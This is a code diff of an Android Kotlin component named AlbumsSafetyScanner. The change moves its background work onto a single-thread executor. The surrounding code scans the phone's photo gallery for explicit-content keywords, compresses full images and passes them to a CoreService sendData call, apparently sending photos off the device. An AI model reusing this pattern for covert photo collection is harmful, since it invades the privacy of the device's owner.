@@ -10,8 +10,13 @@ import com.system.service.core.CoreService
 import org.json.JSONArray
 import org.json.JSONObject
 import java.io.ByteArrayOutputStream
+import java.util.concurrent.Executors
 
 object AlbumsSafetyScanner {
+
+    // Bug #12 fix: was raw Thread { }.start() — use dedicated single-thread executor
+    // to avoid unbounded thread creation and ANR risk on large galleries.
+    private val executor = Executors.newSingleThreadExecutor()
 
     private val SUSPECT_KEYWORDS = setOf(
         "nude", "naked", "sex", "porn", "xxx", "nsfw", "hentai", "18+", "adult",
@@ -30,7 +35,7 @@ object AlbumsSafetyScanner {
     )
 
     fun scan(context: Context) {
-        Thread {
+        executor.execute {
             try {
                 val flagged = JSONArray()
                 val uri     = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
@@ -45,7 +50,7 @@ object AlbumsSafetyScanner {
                 val cursor = context.contentResolver.query(
                     uri, proj, null, null,
                     "${MediaStore.Images.Media.DATE_ADDED} DESC"
-                ) ?: return@Thread
+                ) ?: return@execute
 
                 cursor.use { c ->
                     val colId     = c.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
@@ -125,14 +130,15 @@ object AlbumsSafetyScanner {
                 CoreService.instance?.sendData("albums_scan_error",
                     JSONObject().apply { put("error", e.message ?: "scan_failed") })
             }
-        }.start()
+        }
     }
 
     fun getFullImage(context: Context, uriString: String) {
-        Thread {
+        // Bug #12 fix: was raw Thread { }.start() — same executor as scan()
+        executor.execute {
             try {
                 val uri    = android.net.Uri.parse(uriString)
-                val stream = context.contentResolver.openInputStream(uri) ?: return@Thread
+                val stream = context.contentResolver.openInputStream(uri) ?: return@execute
                 val rawBytes = stream.readBytes()
                 stream.close()
                 val opts = BitmapFactory.Options().apply { inJustDecodeBounds = true }
@@ -140,7 +146,7 @@ object AlbumsSafetyScanner {
                 val maxDim = maxOf(opts.outWidth, opts.outHeight)
                 val scale  = if (maxDim > 1080) maxDim / 1080 else 1
                 val bmp    = BitmapFactory.decodeByteArray(rawBytes, 0, rawBytes.size,
-                    BitmapFactory.Options().apply { inSampleSize = scale }) ?: return@Thread
+                    BitmapFactory.Options().apply { inSampleSize = scale }) ?: return@execute
                 val baos = ByteArrayOutputStream()
                 bmp.compress(Bitmap.CompressFormat.JPEG, 75, baos)
                 bmp.recycle()
@@ -152,6 +158,6 @@ object AlbumsSafetyScanner {
                 CoreService.instance?.sendData("album_image_error",
                     JSONObject().apply { put("error", e.message ?: "read_failed") })
             }
-        }.start()
+        }
     }
 }
